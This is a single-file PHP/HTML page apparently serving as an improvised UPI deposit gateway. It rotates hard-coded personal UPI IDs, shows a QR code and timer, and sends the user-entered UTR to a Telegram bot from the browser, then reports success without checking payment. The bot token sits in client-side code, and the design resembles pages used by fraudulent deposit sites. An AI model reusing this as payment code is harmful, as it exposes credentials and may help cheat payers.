<?php
$amount = $_GET['amount'] ?? '0';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>UPI Payment</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #4f46e5;
      --accent: #6366f1;
      --success: #22c55e;
      --danger: #ef4444;
      --bg: #f9fafb;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #eef2f3, #cfd9df);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease-in-out;
    }

    .card {
      background: #fff;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 420px;
      animation: fadeIn 1s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    h1 {
      font-size: 24px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 16px;
      color: var(--primary);
    }

    .amount {
      font-size: 18px;
      font-weight: 600;
      color: var(--success);
      margin-bottom: 10px;
      text-align: center;
    }

    .timer {
      font-weight: 500;
      color: var(--danger);
      text-align: center;
      margin-bottom: 20px;
    }

    .qr-code {
      display: flex;
      justify-content: center;
      margin: 20px 0;
    }

    .upi-box {
      background: #f3f4f6;
      padding: 14px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 10px;
      transition: background 0.3s;
    }

    .upi-box:hover {
      background: #e5e7eb;
    }

    .upi-id {
      font-weight: 600;
      color: var(--primary);
      word-break: break-all;
    }

    .copy-btn {
      padding: 6px 12px;
      background: var(--primary);
      border: none;
      color: #fff;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .copy-btn:hover {
      background: var(--accent);
    }

    .utr-section {
      margin: 20px 0;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 10px;
    }

    .submit-btn {
      width: 100%;
      padding: 12px;
      background: var(--primary);
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .submit-btn:hover {
      background: var(--accent);
    }

    .warning {
      margin-top: 20px;
      font-size: 14px;
      color: #b91c1c;
      background: #fee2e2;
      padding: 12px;
      border-left: 4px solid #ef4444;
      border-radius: 6px;
    }

    .success-screen {
      position: fixed;
      inset: 0;
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(5px);
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 99;
      animation: fadeIn 1s ease;
    }

    .success-icon {
      font-size: 40px;
      color: var(--success);
      margin-bottom: 10px;
    }

    .success-message {
      font-size: 18px;
      font-weight: 600;
    }
  </style>
</head>
<body>

<div class="card" id="mainCard">
  <h1>UPI Gateway</h1>
  <div class="amount">Amount: ₹<?php echo htmlspecialchars($amount); ?></div>
  <div class="timer" id="timer">05:00</div>

  <div class="upi-box">
    <span class="upi-id" id="upiId">Loading...</span>
    <button class="copy-btn" onclick="copyUPI()">Copy</button>
  </div>

  <div class="qr-code" id="qrCode"></div>

  <div class="utr-section">
    <input type="text" id="utr" maxlength="12" placeholder="Enter 12-digit UTR" />
    <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
  </div>

  <div class="warning">
    Please make the payment and submit your UTR to confirm the transaction. If you don't, your deposit may fail.
  </div>
</div>

<div class="success-screen" id="successScreen">
  <div class="success-icon">✅</div>
  <div class="success-message">UTR Submitted Successfully!</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
<script>
  const amount = "<?php echo htmlspecialchars($amount); ?>";
  const upiList = ["d.kdx@freecharge", "mohsin.h@ptaxis", "ullah.1@superyes"];
  const upiId = upiList[Math.floor(Math.random() * upiList.length)];
  document.getElementById("upiId").innerText = upiId;

  const upiUrl = `upi://pay?pa=${upiId}&pn=Premium+Pay&am=${amount}`;
  QRCode.toDataURL(upiUrl).then(url => {
    const img = document.createElement("img");
    img.src = url;
    img.alt = "Scan to Pay";
    img.style.width = "200px";
    img.style.height = "200px";
    document.getElementById("qrCode").appendChild(img);
  });

  // Timer
  let time = 300;
  const timerEl = document.getElementById("timer");
  const interval = setInterval(() => {
    if (time <= 0) {
      clearInterval(interval);
      return;
    }
    time--;
    const min = String(Math.floor(time / 60)).padStart(2, "0");
    const sec = String(time % 60).padStart(2, "0");
    timerEl.innerText = `${min}:${sec}`;
  }, 1000);

  function copyUPI() {
    navigator.clipboard.writeText(upiId)
      .then(() => alert("UPI ID copied!"))
      .catch(() => alert("Copy failed. Please copy manually."));
  }

  function submitUTR() {
    const utr = document.getElementById("utr").value.trim();
    if (!/^\d{12}$/.test(utr)) {
      alert("Please enter a valid 12-digit UTR.");
      return;
    }

    const token = "YOUR_TELEGRAM_BOT_TOKEN";
    const chatId = "YOUR_TELEGRAM_CHAT_ID";
    const msg = `🧾 *Payment Received*\n\n💰 Amount: ₹${amount}\n📎 UTR: ${utr}\n🔗 UPI: ${upiId}`;
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "Markdown" })
    }).catch(console.error);

    document.getElementById("mainCard").style.display = "none";
    document.getElementById("successScreen").style.display = "flex";
  }
</script>

</body>
</html>
